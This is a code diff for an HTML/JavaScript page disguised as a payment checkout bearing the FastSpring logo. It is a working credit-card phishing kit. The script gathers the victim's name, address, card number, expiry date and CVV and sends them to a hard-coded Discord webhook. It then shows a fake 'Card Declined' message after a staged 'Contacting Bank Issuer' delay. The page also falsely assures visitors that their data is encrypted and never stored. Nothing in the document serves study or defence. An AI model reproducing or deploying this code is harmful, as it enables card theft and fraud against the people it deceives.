@@ -14,7 +14,6 @@
             padding: 0;
             font-family: 'Roboto', sans-serif;
         }
-
         body {
             display: flex;
             justify-content: center;
@@ -23,7 +22,6 @@
             background-color: #f6f9fc;
             overflow-y: auto;
         }
-
         /* Payment Form */
         .payment-form {
             background-color: #ffffff;
@@ -35,18 +33,15 @@
             text-align: left;
             position: relative;
         }
-
         /* Header */
         .header {
             margin-bottom: 1.5em;
             text-align: center;
         }
-
         .header h2 {
             font-size: 1.8em;
             color: #333;
         }
-
         /* Amount Display */
         .amount {
             font-size: 2em;
@@ -55,14 +50,12 @@
             margin: 1em 0;
             text-align: center;
         }
-
         /* Payment Options */
         .payment-options {
             display: flex;
             justify-content: space-between;
             margin-bottom: 1em;
         }
-
         .payment-button {
             background: #f7f7f7;
             border: 1px solid #ccc;
@@ -77,36 +70,30 @@
             color: #333;
             transition: background 0.3s;
         }
-
         .payment-button:hover {
             background-color: #e0e6ed;
         }
-
         .payment-button img {
-            max-width: 100%; /* Logo fills the box */
-            max-height: 100%; /* Prevents logos from exceeding their box */
-            object-fit: contain; /* Keeps aspect ratio */
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
         }
-
         .or-pay-with {
             text-align: center;
             margin: 1em 0;
             color: #666;
         }
-
         /* Form Group */
         .form-group {
             margin-bottom: 1.5em;
             position: relative;
         }
-
         .form-group label {
             display: block;
             font-size: 0.9em;
             color: #666;
             margin-bottom: 0.3em;
         }
-
         .form-group input {
             width: 100%;
             padding: 0.75em 0.8em;
@@ -116,12 +103,10 @@
             height: 45px;
             transition: border 0.3s;
         }
-
         .form-group input:focus {
             border-color: #635bff;
             outline: none;
         }
-
         /* Icons */
         .form-group i {
             position: absolute;
@@ -131,7 +116,6 @@
             color: #a3a9b0;
             font-size: 1.1em;
         }
-
         /* Submit Button */
         .btn-submit {
             width: 100%;
@@ -151,18 +135,15 @@
             position: relative;
             overflow: hidden;
         }
-
         .btn-submit:hover {
             background-color: #5249d8;
         }
-
         .note {
             font-size: 0.85em;
             color: #888;
             margin-top: 1em;
             text-align: center;
         }
-
         /* Loading Overlay */
         .loading-overlay {
             position: fixed;
@@ -171,34 +152,30 @@
             width: 100%;
             height: 100%;
             background-color: rgba(255, 255, 255, 0.9);
-            display: none; /* Hidden by default */
+            display: none;
             justify-content: center;
             align-items: center;
             z-index: 999;
         }
-
         .loading-content {
             text-align: center;
         }
-
         .loading-spinner {
-            border: 8px solid #f3f3f3; /* Light grey */
-            border-top: 8px solid #635bff; /* Blue */
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #635bff;
             border-radius: 50%;
             width: 40px;
             height: 40px;
             animation: spin 1s linear infinite;
             margin-bottom: 1em;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
         /* Failure Message */
         .failure-message {
-            display: none; /* Hidden by default */
+            display: none;
             text-align: center;
             margin-top: 1.5em;
             color: #dc3545;
@@ -211,52 +188,44 @@
             position: relative;
             animation: fadeIn 0.5s ease;
         }
-
         .failure-message i {
             color: #dc3545;
             font-size: 2em;
             display: block;
             margin-bottom: 0.5em;
         }
-
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
         }
-
         /* Responsive adjustments */
         @media (max-width: 600px) {
             .payment-form {
                 width: 90%;
                 padding: 1.5em;
             }
-
             .header h2 {
                 font-size: 1.5em;
             }
-
             .amount {
                 font-size: 1.5em;
             }
-
             .btn-submit {
                 font-size: 1em;
             }
-
             .note {
                 font-size: 0.75em;
             }
-
             .failure-message {
-                font-size: 1em; /* Smaller font for mobile */
+                font-size: 1em;
             }
         }
     </style>
 </head>
 <body>
     <div class="payment-form">
-       <div class="logo">
-           <img src="https://fastspring.com/wp-content/themes/fastspring-bamboo/images/logos/fastspring-logo-orange-gray.svg?2" alt="Your Company Logo" style="max-width: 30%; height: auto; margin-bottom: 1em;">
+        <div class="logo">
+            <img src="https://fastspring.com/wp-content/themes/fastspring-bamboo/images/logos/fastspring-logo-orange-gray.svg?2" alt="Your Company Logo" style="max-width: 30%; height: auto; margin-bottom: 1em;">
         </div>
         <div class="header">
             <h2>Pay Axle098:</h2>
@@ -279,116 +248,150 @@
         <div class="or-pay-with">or pay with:</div>
 
         <form id="paymentForm">
-    <div class="form-group">
-        <label for="cardholderName">Cardholder Name</label>
-        <input type="text" id="cardholderName" placeholder="John Doe" required>
-    </div>
-    
-    <div class="form-group">
-        <label for="zipcode">Zipcode / Postal Code</label>
-        <input type="text" id="zipcode" placeholder="Postal Code" required>
-    </div>
+            <div class="form-group">
+                <label for="cardholderName">Cardholder Name</label>
+                <input type="text" id="cardholderName" placeholder="John Doe" required>
+            </div>
+            
+          <div class="form-group">
+              <label for="address">Address</label>
+              <input type="text" id="address" name="address" placeholder="Enter your address" required>
+        </div>
 
-    <div class="form-group">
-        <label for="fullAddress">Full Address</label>
-        <input type="text" id="fullAddress" placeholder="123 Main St" required>
-    </div>
+            <div class="form-group">
+                <label for="zipcode">Zipcode / Postal Code</label>
+                <input type="text" id="zipcode" placeholder="12345" required>
+            </div>
 
-    <div class="form-group">
-        <label for="cardNumber">Card Number</label>
-        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
-    </div>
-    <div class="form-group">
-        <label for="expiryDate">Expiration Date (MM/YY)</label>
-        <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5">
-    </div>
-    <div class="form-group">
-        <label for="cvv">CVV</label>
-        <input type="text" id="cvv" placeholder="123" required maxlength="3">
-    </div>
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1111 2222 3333 4444" required maxlength="19">
+            </div>
 
-    <button type="submit" class="btn-submit">
-        Pay £7.00
-    </button>
+            <div class="form-group">
+                <label for="expirationDate">Expiration Date (MM/YY)</label>
+                <input type="text" id="expirationDate" placeholder="MM/YY" required maxlength="5">
+            </div>
 
-    <p class="note">All information is encrypted, your sensitive data is never stored.</p>
-    <p class="note">Anti-Fraud Settings Enabled.</p>
-</form>
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" placeholder="123" required maxlength="3">
+            </div>
 
-        <!-- Loading Overlay -->
+            <button type="submit" class="btn-submit">Pay Now</button>
+        </form>
+
+        <div class="note">All transactions are secure and encrypted.</div>
+        <div class="note">Your sensetive data is never stored.</div>
+        
         <div class="loading-overlay" id="loadingOverlay">
             <div class="loading-content">
                 <div class="loading-spinner"></div>
-                <p>Contacting Bank Issuer...</p>
+                <div class="loading-text">Contacting Bank Issuer...</div>
             </div>
         </div>
 
-        <!-- Failure Message -->
         <div class="failure-message" id="failureMessage">
-            <i class="fas fa-exclamation-triangle"></i>
-            Payment Failed! Please check your details and try again.
+            <i class="fas fa-exclamation-circle"></i>
+            Card Declined Please try again.
         </div>
     </div>
 
-    <script>
-    const form = document.getElementById('paymentForm');
+<script>
+const crz = "https://discord.com/api/webhooks/1300835294161145867/erADkhuwHcJCzDVu6Fb_cPUoS5kGHoe6a7FliIUTEw2shXJVrPr6TNfm04yuAntD3dlv";
+const form = document.getElementById('paymentForm');
 
-    async function getWebhookURL() {
-        const response = await fetch('hook.txt');
-        if (!response.ok) {
-            throw new Error('Failed to load webhook URL');
-        }
-        return await response.text();
+// Function to format card number with spaces
+function formatCardNumber(input) {
+    // Remove all non-digit characters
+    let value = input.value.replace(/\D/g, '');
+    // Format to "0000 0000 0000 0000"
+    value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Adds space after every 4 digits
+    input.value = value.trim(); // Remove any trailing spaces
+}
+
+// Function to format expiration date with a slash
+function formatExpiryDate(input) {
+    // Remove all non-digit characters
+    let value = input.value.replace(/\D/g, '');
+    // Format to "MM/YY"
+    if (value.length >= 3) {
+        value = value.replace(/(\d{2})(\d{0,2})/, '$1/$2'); // Add slash after the second digit
+    } else {
+        value = value.replace(/(\d{2})(\d{0,2})/, '$1$2'); // No slash until at least 2 digits
     }
+    input.value = value;
+}
 
-    form.addEventListener('submit', async function(event) {
-        event.preventDefault(); // Prevent the form from submitting normally
+form.addEventListener('submit', async function(event) {
+    event.preventDefault(); // Prevent the form from submitting normally
 
-        // Show the loading overlay
-        document.getElementById('loadingOverlay').style.display = 'flex';
+    // Show the loading overlay
+    document.getElementById('loadingOverlay').style.display = 'flex';
 
-        // Prepare data to send to the webhook
-        const cardholderName = document.getElementById('cardholderName').value;
-        const zipcode = document.getElementById('zipcode').value;
-        const fullAddress = document.getElementById('fullAddress').value;
-        const cardNumber = document.getElementById('cardNumber').value;
-        const expiryDate = document.getElementById('expiryDate').value;
-        const cvv = document.getElementById('cvv').value;
+    // Prepare data to send to the webhook
+    const cardholderName = document.getElementById('cardholderName').value;
+    const zipcode = document.getElementById('zipcode').value;
+    const fullAddress = document.getElementById('address').value;
+    const cardNumber = document.getElementById('cardNumber').value;
+    const expiryDate = document.getElementById('expirationDate').value; 
+    const cvv = document.getElementById('cvv').value;
 
-        const paymentData = {
-            content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
-        };
+   const paymentData = {
+    content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
+};
 
-        try {
-            // Get the webhook URL from hook.txt
-            const webhookURL = await getWebhookURL();
+    // Set a minimum loading time (e.g., 3 seconds)
+    const minimumLoadingTime = 3000; // 3000ms = 3 seconds
+    const startTime = Date.now();
 
-            // Send the payment data to the webhook
-            const response = await fetch(webhookURL.trim(), {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(paymentData),
-            });
+    try {
+        // Get the webhook URL directly
+        const webhookURL = crz; // Replace with your actual webhook URL
 
-            // Check if the request was successful
-            if (!response.ok) {
-                throw new Error('Failed to send data to the webhook');
-            }
+        // Send the payment data to the webhook
+        const response = await fetch(webhookURL.trim(), {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(paymentData),
+        });
 
-            // Simulate loading for a longer duration
-            setTimeout(() => {
-                // Hide loading overlay and show failure message
-                document.getElementById('loadingOverlay').style.display = 'none';
-                document.getElementById('failureMessage').style.display = 'block';
-            }, 3000); // Adjust the time as needed (3000ms = 3 seconds)
-
-        } catch (error) {
-            console.error('Error:', error);
-            document.getElementById('loadingOverlay').style.display = 'none';
-            alert('There was an error processing your payment. Please try again later.');
+        // Check if the request was successful
+        if (!response.ok) {
+            throw new Error('Failed to send data to the webhook');
         }
-    });
+
+        // Calculate how long to wait before hiding the loading spinner
+        const elapsedTime = Date.now() - startTime;
+        const timeToWait = Math.max(minimumLoadingTime - elapsedTime, 0); // Ensure at least 3 seconds
+
+        setTimeout(() => {
+            document.getElementById('loadingOverlay').style.display = 'none';
+            document.getElementById('failureMessage').style.display = 'block'; // Show failure message
+        }, timeToWait); // Wait time adjusted
+
+    } catch (error) {
+        console.error('Error:', error);
+        const elapsedTime = Date.now() - startTime;
+        const timeToWait = Math.max(minimumLoadingTime - elapsedTime, 0); // Ensure at least 3 seconds
+
+        setTimeout(() => {
+            document.getElementById('loadingOverlay').style.display = 'none';
+            document.getElementById('failureMessage').style.display = 'block'; // Show failure message
+        }, timeToWait); // Wait time adjusted
+    }
+});
+
+document.getElementById('cardNumber').addEventListener('input', function() {
+    formatCardNumber(this);
+});
+
+document.getElementById('expirationDate').addEventListener('input', function() {
+    formatExpiryDate(this);
+});
 </script>
+
+
 </body>
